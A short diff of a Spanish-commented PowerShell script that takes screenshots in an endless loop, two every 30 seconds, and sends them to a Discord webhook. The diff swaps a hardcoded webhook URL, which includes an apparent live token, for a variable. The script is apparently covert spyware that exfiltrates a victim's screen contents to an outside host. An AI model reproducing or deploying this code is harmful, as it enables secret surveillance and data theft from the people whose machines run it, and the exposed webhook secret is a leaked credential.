@@ -1,7 +1,7 @@
 # Función para tomar una captura de pantalla y enviarla al webhook
 function Send-ScreenshotToDiscord {
     # Definir la URL del webhook de Discord
-    $webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+    $webhookUrl = "$dc"
 
     # Definir el nombre del archivo de la captura de pantalla con fecha y hora
     $fileName = "$env:TEMP\SC_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
@@ -34,7 +34,7 @@ function Send-ScreenshotToDiscord {
 }
 
 # Bucle principal: tomar dos capturas de pantalla cada 30 segundos
-while ($true) {
+While ($true) {
     Send-ScreenshotToDiscord
     Send-ScreenshotToDiscord
     Start-Sleep -Seconds 30
